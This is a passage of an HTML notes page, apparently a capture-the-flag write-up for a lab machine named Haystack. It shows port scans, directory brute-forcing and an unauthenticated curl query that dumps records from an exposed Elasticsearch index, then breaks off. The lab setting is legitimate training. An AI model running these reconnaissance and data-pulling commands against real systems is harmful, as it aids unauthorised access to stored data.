@@ -1,0 +1,678 @@
+<!--*INDEXED*-->
+<html>
+<head>
+    <!-- meta things -->
+    <meta name=viewport content="width=device-width, initial-scale=1">
+    <title>Note - Nathan Higley</title>
+    <link rel="canonical" href="https://nathanhigley.com" />
+    <!-- end meta things -->
+  
+    <!-- favicon code -->
+    <link rel="apple-touch-icon" sizes="180x180" href="../../images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../../images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../../images/favicon-16x16.png">
+    <link rel="manifest" href="../../images/site.webmanifest">
+    <link rel="shortcut icon" href="../../images/favicon.ico">
+    <meta name="msapplication-TileColor" content="#2b5797">
+    <meta name="msapplication-config" content="../../images/browserconfig.xml">
+    <meta name="theme-color" content="#ffffff">
+    <!-- end favicon code -->
+  
+    <!-- style sheets -->
+    <link rel="stylesheet" href="../../style-sheets/styles.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-grid.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-grid.min.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-reboot.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-reboot.min.css">
+    <link rel="stylesheet" href="../../style-sheets/fontawesome.css">
+    <link rel="stylesheet" href="../../style-sheets/fonts.css">
+    <!-- end style sheets -->
+    <link rel="stylesheet" href="css/boostnote.css">
+    <link rel="stylesheet" href="css/dracula.css">
+    <link rel="stylesheet" href="css/katex.min.css">
+    <link rel="stylesheet" href="css/codemirror.css">
+    <link rel="stylesheet" href="css/main.min.css">
+</head>
+<body class="note-body">
+
+    <!-- nav code -->
+    <nav>
+        <ul class="note-header"> 
+            <li class="nav"><a class="nav" href="../../index.html#home"><i class="fas fa-igloo"></i><span class="labels"> Home</span></a></li>
+            <li class="nav"><a class="nav" href="../../index.html#about"><i class="fas fa-info-circle"></i><span class="labels"> About</span></a></li>
+            <li class="nav"><a class="nav" href="../../index.html#work"><i class="fas fa-desktop"></i><span class="labels"> Work</span></a></li>
+            <li class="nav"><a class="nav" href="../../index.html#contact"><i class="fas fa-address-card"></i><span class="labels"> Contact</span></a></li>
+            <li class="nav"><a class="nav" href="../notes.html"><i class="fas fa-sticky-note"></i><span class="labels"> Notes</span></a></li>
+        </ul>
+    </nav>
+    <!-- end nav code -->
+    <div class="d-flex" >
+      <div class="container-fluid">
+        <div class="row">
+          <div class="col-lg-12 note-spacer"></div>
+          <div class="col-lg-12"><h1 id="Haystack" data-line="0">Haystack</h1><p data-line="2">Box IP: 10.10.10.115</p>
+<h2 id="Enumeration" data-line="4">Enumeration</h2>
+<h3 id="Masscan" data-line="6">Masscan</h3>
+<pre class="code CodeMirror cm-s-dracula" data-line="8">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span></span>
+        <code class="">╰─# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.115 --rate=500
+
+Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-08 22:40:37 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+Discovered open port 22/tcp on 10.10.10.115                                    
+Discovered open port 80/tcp on 10.10.10.115                                    
+Discovered open port 9200/tcp on 10.10.10.115 
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><h3 id="NMap" data-line="20">NMap</h3>
+<pre class="code CodeMirror cm-s-dracula" data-line="21">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span><span class="CodeMirror-linenumber">15</span><span class="CodeMirror-linenumber">16</span><span class="CodeMirror-linenumber">17</span><span class="CodeMirror-linenumber">18</span><span class="CodeMirror-linenumber">19</span><span class="CodeMirror-linenumber">20</span><span class="CodeMirror-linenumber">21</span><span class="CodeMirror-linenumber">22</span><span class="CodeMirror-linenumber">23</span><span class="CodeMirror-linenumber">24</span><span class="CodeMirror-linenumber">25</span><span class="CodeMirror-linenumber">26</span><span class="CodeMirror-linenumber">27</span><span class="CodeMirror-linenumber">28</span><span class="CodeMirror-linenumber">29</span><span class="CodeMirror-linenumber">30</span><span class="CodeMirror-linenumber">31</span><span class="CodeMirror-linenumber">32</span><span class="CodeMirror-linenumber">33</span></span>
+        <code class="">╰─# nmap -T4 -A -p 22,80,9200 10.10.10.115
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-08 18:52 EDT
+Nmap scan report for 10.10.10.115
+Host is up (0.049s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
+|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
+|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
+80/tcp   open  http    nginx 1.12.2
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (text/html).
+9200/tcp open  http    nginx 1.12.2
+| http-methods: 
+|_  Potentially risky methods: DELETE
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+TRACEROUTE (using port 9200/tcp)
+HOP RTT      ADDRESS
+1   49.15 ms 10.10.14.1
+2   49.32 ms 10.10.10.115
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.88 seconds
+
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><h3 id="Dirb" data-line="57">Dirb</h3>
+<pre class="code CodeMirror cm-s-dracula" data-line="59">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span><span class="CodeMirror-linenumber">15</span><span class="CodeMirror-linenumber">16</span><span class="CodeMirror-linenumber">17</span><span class="CodeMirror-linenumber">18</span><span class="CodeMirror-linenumber">19</span><span class="CodeMirror-linenumber">20</span><span class="CodeMirror-linenumber">21</span><span class="CodeMirror-linenumber">22</span><span class="CodeMirror-linenumber">23</span></span>
+        <code class="">╰─$ dirb http://10.10.10.115
+
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Sep  8 18:54:12 2019
+URL_BASE: http://10.10.10.115/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.115/ ----
++ http://10.10.10.115/index.html (CODE:200|SIZE:55)                            
+                                                                               
+-----------------
+END_TIME: Sun Sep  8 18:58:09 2019
+DOWNLOADED: 4612 - FOUND: 1
+
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><h3 id="Dig" data-line="85">Dig</h3>
+<pre class="code CodeMirror cm-s-dracula" data-line="86">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span><span class="CodeMirror-linenumber">15</span><span class="CodeMirror-linenumber">16</span><span class="CodeMirror-linenumber">17</span><span class="CodeMirror-linenumber">18</span><span class="CodeMirror-linenumber">19</span><span class="CodeMirror-linenumber">20</span></span>
+        <code class="">╰─$ dig 10.10.10.115
+
+; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; 10.10.10.115
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 30282
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;10.10.10.115.          IN  A
+
+;; AUTHORITY SECTION:
+.           3600    IN  SOA a.root-servers.net. nstld.verisign-grs.com. 2019090800 1800 900 604800 86400
+
+;; Query time: 12 msec
+;; SERVER: 10.255.48.102#53(10.255.48.102)
+;; WHEN: Sun Sep 08 19:10:50 EDT 2019
+;; MSG SIZE  rcvd: 116
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><h3 id="Found-at-port-9200" data-line="109">Found at port 9200</h3>
+<pre class="code CodeMirror cm-s-dracula" data-line="110">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span><span class="CodeMirror-linenumber">15</span><span class="CodeMirror-linenumber">16</span><span class="CodeMirror-linenumber">17</span></span>
+        <code class="">{
+  "name" : "iQEYHgS",
+  "cluster_name" : "elasticsearch",
+  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
+  "version" : {
+    "number" : "6.4.2",
+    "build_flavor" : "default",
+    "build_type" : "rpm",
+    "build_hash" : "04711c2",
+    "build_date" : "2018-09-26T13:34:09.098244Z",
+    "build_snapshot" : false,
+    "lucene_version" : "7.4.0",
+    "minimum_wire_compatibility_version" : "5.6.0",
+    "minimum_index_compatibility_version" : "5.0.0"
+  },
+  "tagline" : "You Know, for Search"
+}
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="130">This appears to indicate that the program ElasticSearch is installed… Which makes sense given the machine name.</p>
+<p data-line="132">Running a search query returns me this:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="133">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span><span class="CodeMirror-linenumber">15</span><span class="CodeMirror-linenumber">16</span><span class="CodeMirror-linenumber">17</span><span class="CodeMirror-linenumber">18</span><span class="CodeMirror-linenumber">19</span><span class="CodeMirror-linenumber">20</span><span class="CodeMirror-linenumber">21</span><span class="CodeMirror-linenumber">22</span><span class="CodeMirror-linenumber">23</span><span class="CodeMirror-linenumber">24</span><span class="CodeMirror-linenumber">25</span><span class="CodeMirror-linenumber">26</span><span class="CodeMirror-linenumber">27</span><span class="CodeMirror-linenumber">28</span><span class="CodeMirror-linenumber">29</span><span class="CodeMirror-linenumber">30</span><span class="CodeMirror-linenumber">31</span><span class="CodeMirror-linenumber">32</span><span class="CodeMirror-linenumber">33</span><span class="CodeMirror-linenumber">34</span><span class="CodeMirror-linenumber">35</span><span class="CodeMirror-linenumber">36</span><span class="CodeMirror-linenumber">37</span><span class="CodeMirror-linenumber">38</span><span class="CodeMirror-linenumber">39</span><span class="CodeMirror-linenumber">40</span><span class="CodeMirror-linenumber">41</span><span class="CodeMirror-linenumber">42</span><span class="CodeMirror-linenumber">43</span><span class="CodeMirror-linenumber">44</span><span class="CodeMirror-linenumber">45</span><span class="CodeMirror-linenumber">46</span><span class="CodeMirror-linenumber">47</span><span class="CodeMirror-linenumber">48</span><span class="CodeMirror-linenumber">49</span><span class="CodeMirror-linenumber">50</span><span class="CodeMirror-linenumber">51</span><span class="CodeMirror-linenumber">52</span><span class="CodeMirror-linenumber">53</span><span class="CodeMirror-linenumber">54</span><span class="CodeMirror-linenumber">55</span><span class="CodeMirror-linenumber">56</span><span class="CodeMirror-linenumber">57</span><span class="CodeMirror-linenumber">58</span><span class="CodeMirror-linenumber">59</span><span class="CodeMirror-linenumber">60</span><span class="CodeMirror-linenumber">61</span><span class="CodeMirror-linenumber">62</span><span class="CodeMirror-linenumber">63</span><span class="CodeMirror-linenumber">64</span><span class="CodeMirror-linenumber">65</span><span class="CodeMirror-linenumber">66</span><span class="CodeMirror-linenumber">67</span><span class="CodeMirror-linenumber">68</span><span class="CodeMirror-linenumber">69</span><span class="CodeMirror-linenumber">70</span><span class="CodeMirror-linenumber">71</span><span class="CodeMirror-linenumber">72</span><span class="CodeMirror-linenumber">73</span><span class="CodeMirror-linenumber">74</span><span class="CodeMirror-linenumber">75</span><span class="CodeMirror-linenumber">76</span><span class="CodeMirror-linenumber">77</span><span class="CodeMirror-linenumber">78</span><span class="CodeMirror-linenumber">79</span><span class="CodeMirror-linenumber">80</span><span class="CodeMirror-linenumber">81</span><span class="CodeMirror-linenumber">82</span><span class="CodeMirror-linenumber">83</span><span class="CodeMirror-linenumber">84</span><span class="CodeMirror-linenumber">85</span><span class="CodeMirror-linenumber">86</span><span class="CodeMirror-linenumber">87</span><span class="CodeMirror-linenumber">88</span><span class="CodeMirror-linenumber">89</span><span class="CodeMirror-linenumber">90</span><span class="CodeMirror-linenumber">91</span><span class="CodeMirror-linenumber">92</span><span class="CodeMirror-linenumber">93</span><span class="CodeMirror-linenumber">94</span><span class="CodeMirror-linenumber">95</span><span class="CodeMirror-linenumber">96</span><span class="CodeMirror-linenumber">97</span><span class="CodeMirror-linenumber">98</span><span class="CodeMirror-linenumber">99</span><span class="CodeMirror-linenumber">100</span><span class="CodeMirror-linenumber">101</span><span class="CodeMirror-linenumber">102</span><span class="CodeMirror-linenumber">103</span><span class="CodeMirror-linenumber">104</span><span class="CodeMirror-linenumber">105</span><span class="CodeMirror-linenumber">106</span><span class="CodeMirror-linenumber">107</span><span class="CodeMirror-linenumber">108</span><span class="CodeMirror-linenumber">109</span><span class="CodeMirror-linenumber">110</span><span class="CodeMirror-linenumber">111</span><span class="CodeMirror-linenumber">112</span><span class="CodeMirror-linenumber">113</span><span class="CodeMirror-linenumber">114</span><span class="CodeMirror-linenumber">115</span><span class="CodeMirror-linenumber">116</span><span class="CodeMirror-linenumber">117</span><span class="CodeMirror-linenumber">118</span><span class="CodeMirror-linenumber">119</span><span class="CodeMirror-linenumber">120</span><span class="CodeMirror-linenumber">121</span><span class="CodeMirror-linenumber">122</span><span class="CodeMirror-linenumber">123</span><span class="CodeMirror-linenumber">124</span><span class="CodeMirror-linenumber">125</span><span class="CodeMirror-linenumber">126</span><span class="CodeMirror-linenumber">127</span><span class="CodeMirror-linenumber">128</span><span class="CodeMirror-linenumber">129</span><span class="CodeMirror-linenumber">130</span><span class="CodeMirror-linenumber">131</span><span class="CodeMirror-linenumber">132</span><span class="CodeMirror-linenumber">133</span><span class="CodeMirror-linenumber">134</span><span class="CodeMirror-linenumber">135</span><span class="CodeMirror-linenumber">136</span><span class="CodeMirror-linenumber">137</span><span class="CodeMirror-linenumber">138</span><span class="CodeMirror-linenumber">139</span><span class="CodeMirror-linenumber">140</span><span class="CodeMirror-linenumber">141</span><span class="CodeMirror-linenumber">142</span><span class="CodeMirror-linenumber">143</span><span class="CodeMirror-linenumber">144</span><span class="CodeMirror-linenumber">145</span><span class="CodeMirror-linenumber">146</span><span class="CodeMirror-linenumber">147</span><span class="CodeMirror-linenumber">148</span><span class="CodeMirror-linenumber">149</span><span class="CodeMirror-linenumber">150</span><span class="CodeMirror-linenumber">151</span><span class="CodeMirror-linenumber">152</span><span class="CodeMirror-linenumber">153</span><span class="CodeMirror-linenumber">154</span><span class="CodeMirror-linenumber">155</span><span class="CodeMirror-linenumber">156</span><span class="CodeMirror-linenumber">157</span><span class="CodeMirror-linenumber">158</span><span class="CodeMirror-linenumber">159</span><span class="CodeMirror-linenumber">160</span><span class="CodeMirror-linenumber">161</span><span class="CodeMirror-linenumber">162</span><span class="CodeMirror-linenumber">163</span><span class="CodeMirror-linenumber">164</span><span class="CodeMirror-linenumber">165</span><span class="CodeMirror-linenumber">166</span><span class="CodeMirror-linenumber">167</span><span class="CodeMirror-linenumber">168</span><span class="CodeMirror-linenumber">169</span><span class="CodeMirror-linenumber">170</span><span class="CodeMirror-linenumber">171</span><span class="CodeMirror-linenumber">172</span><span class="CodeMirror-linenumber">173</span><span class="CodeMirror-linenumber">174</span><span class="CodeMirror-linenumber">175</span><span class="CodeMirror-linenumber">176</span><span class="CodeMirror-linenumber">177</span><span class="CodeMirror-linenumber">178</span><span class="CodeMirror-linenumber">179</span><span class="CodeMirror-linenumber">180</span><span class="CodeMirror-linenumber">181</span><span class="CodeMirror-linenumber">182</span><span class="CodeMirror-linenumber">183</span><span class="CodeMirror-linenumber">184</span><span class="CodeMirror-linenumber">185</span><span class="CodeMirror-linenumber">186</span><span class="CodeMirror-linenumber">187</span><span class="CodeMirror-linenumber">188</span><span class="CodeMirror-linenumber">189</span><span class="CodeMirror-linenumber">190</span><span class="CodeMirror-linenumber">191</span><span class="CodeMirror-linenumber">192</span><span class="CodeMirror-linenumber">193</span><span class="CodeMirror-linenumber">194</span><span class="CodeMirror-linenumber">195</span><span class="CodeMirror-linenumber">196</span><span class="CodeMirror-linenumber">197</span><span class="CodeMirror-linenumber">198</span><span class="CodeMirror-linenumber">199</span><span class="CodeMirror-linenumber">200</span><span class="CodeMirror-linenumber">201</span><span class="CodeMirror-linenumber">202</span><span class="CodeMirror-linenumber">203</span></span>
+        <code class="">╰─$ curl -XPOST '10.10.10.115:9200/_search?pretty'
+{
+  "took" : 7,
+  "timed_out" : false,
+  "_shards" : {
+    "total" : 11,
+    "successful" : 11,
+    "skipped" : 0,
+    "failed" : 0
+  },
+  "hits" : {
+    "total" : 1254,
+    "max_score" : 1.0,
+    "hits" : [
+      {
+        "_index" : ".kibana",
+        "_type" : "doc",
+        "_id" : "config:6.4.2",
+        "_score" : 1.0,
+        "_source" : {
+          "type" : "config",
+          "updated_at" : "2019-01-23T18:15:53.396Z",
+          "config" : {
+            "buildNum" : 18010,
+            "telemetry:optIn" : false
+          }
+        }
+      },
+      {
+        "_index" : "bank",
+        "_type" : "account",
+        "_id" : "25",
+        "_score" : 1.0,
+        "_source" : {
+          "account_number" : 25,
+          "balance" : 40540,
+          "firstname" : "Virginia",
+          "lastname" : "Ayala",
+          "age" : 39,
+          "gender" : "F",
+          "address" : "171 Putnam Avenue",
+          "employer" : "Filodyne",
+          "email" : "virginiaayala@filodyne.com",
+          "city" : "Nicholson",
+          "state" : "PA"
+        }
+      },
+      {
+        "_index" : "bank",
+        "_type" : "account",
+        "_id" : "44",
+        "_score" : 1.0,
+        "_source" : {
+          "account_number" : 44,
+          "balance" : 34487,
+          "firstname" : "Aurelia",
+          "lastname" : "Harding",
+          "age" : 37,
+          "gender" : "M",
+          "address" : "502 Baycliff Terrace",
+          "employer" : "Orbalix",
+          "email" : "aureliaharding@orbalix.com",
+          "city" : "Yardville",
+          "state" : "DE"
+        }
+      },
+      {
+        "_index" : "bank",
+        "_type" : "account",
+        "_id" : "99",
+        "_score" : 1.0,
+        "_source" : {
+          "account_number" : 99,
+          "balance" : 47159,
+          "firstname" : "Ratliff",
+          "lastname" : "Heath",
+          "age" : 39,
+          "gender" : "F",
+          "address" : "806 Rockwell Place",
+          "employer" : "Zappix",
+          "email" : "ratliffheath@zappix.com",
+          "city" : "Shaft",
+          "state" : "ND"
+        }
+      },
+      {
+        "_index" : "bank",
+        "_type" : "account",
+        "_id" : "119",
+        "_score" : 1.0,
+        "_source" : {
+          "account_number" : 119,
+          "balance" : 49222,
+          "firstname" : "Laverne",
+          "lastname" : "Johnson",
+          "age" : 28,
+          "gender" : "F",
+          "address" : "302 Howard Place",
+          "employer" : "Senmei",
+          "email" : "lavernejohnson@senmei.com",
+          "city" : "Herlong",
+          "state" : "DC"
+        }
+      },
+      {
+        "_index" : "bank",
+        "_type" : "account",
+        "_id" : "126",
+        "_score" : 1.0,
+        "_source" : {
+          "account_number" : 126,
+          "balance" : 3607,
+          "firstname" : "Effie",
+          "lastname" : "Gates",
+          "age" : 39,
+          "gender" : "F",
+          "address" : "620 National Drive",
+          "employer" : "Digitalus",
+          "email" : "effiegates@digitalus.com",
+          "city" : "Blodgett",
+          "state" : "MD"
+        }
+      },
+      {
+        "_index" : "bank",
+        "_type" : "account",
+        "_id" : "145",
+        "_score" : 1.0,
+        "_source" : {
+          "account_number" : 145,
+          "balance" : 47406,
+          "firstname" : "Rowena",
+          "lastname" : "Wilkinson",
+          "age" : 32,
+          "gender" : "M",
+          "address" : "891 Elton Street",
+          "employer" : "Asimiline",
+          "email" : "rowenawilkinson@asimiline.com",
+          "city" : "Ripley",
+          "state" : "NH"
+        }
+      },
+      {
+        "_index" : "bank",
+        "_type" : "account",
+        "_id" : "183",
+        "_score" : 1.0,
+        "_source" : {
+          "account_number" : 183,
+          "balance" : 14223,
+          "firstname" : "Hudson",
+          "lastname" : "English",
+          "age" : 26,
+          "gender" : "F",
+          "address" : "823 Herkimer Place",
+          "employer" : "Xinware",
+          "email" : "hudsonenglish@xinware.com",
+          "city" : "Robbins",
+          "state" : "ND"
+        }
+      },
+      {
+        "_index" : "bank",
+        "_type" : "account",
+        "_id" : "190",
+        "_score" : 1.0,
+        "_source" : {
+          "account_number" : 190,
+          "balance" : 3150,
+          "firstname" : "Blake",
+          "lastname" : "Davidson",
+          "age" : 30,
+          "gender" : "F",
+          "address" : "636 Diamond Street",
+          "employer" : "Quantasis",
+          "email" : "blakedavidson@quantasis.com",
+          "city" : "Crumpler",
+          "state" : "KY"
+        }
+      },
+      {
+        "_index" : "bank",
+        "_type" : "account",
+        "_id" : "208",
+        "_score" : 1.0,
+        "_source" : {
+          "account_number" : 208,
+          "balance" : 40760,
+          "firstname" : "Garcia",
+          "lastname" : "Hess",
+          "age" : 26,
+          "gender" : "F",
+          "address" : "810 Nostrand Avenue",
+          "employer" : "Quiltigen",
+          "email" : "garciahess@quiltigen.com",
+          "city" : "Brooktrails",
+          "state" : "GA"
+        }
+      }
+    ]
+  }
+}
+
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="339">Now that I know this is probably the key to the box, its time to run another dirb:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="340">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span><span class="CodeMirror-linenumber">15</span><span class="CodeMirror-linenumber">16</span><span class="CodeMirror-linenumber">17</span><span class="CodeMirror-linenumber">18</span><span class="CodeMirror-linenumber">19</span><span class="CodeMirror-linenumber">20</span><span class="CodeMirror-linenumber">21</span><span class="CodeMirror-linenumber">22</span><span class="CodeMirror-linenumber">23</span><span class="CodeMirror-linenumber">24</span><span class="CodeMirror-linenumber">25</span><span class="CodeMirror-linenumber">26</span><span class="CodeMirror-linenumber">27</span><span class="CodeMirror-linenumber">28</span><span class="CodeMirror-linenumber">29</span><span class="CodeMirror-linenumber">30</span><span class="CodeMirror-linenumber">31</span><span class="CodeMirror-linenumber">32</span><span class="CodeMirror-linenumber">33</span><span class="CodeMirror-linenumber">34</span><span class="CodeMirror-linenumber">35</span><span class="CodeMirror-linenumber">36</span><span class="CodeMirror-linenumber">37</span><span 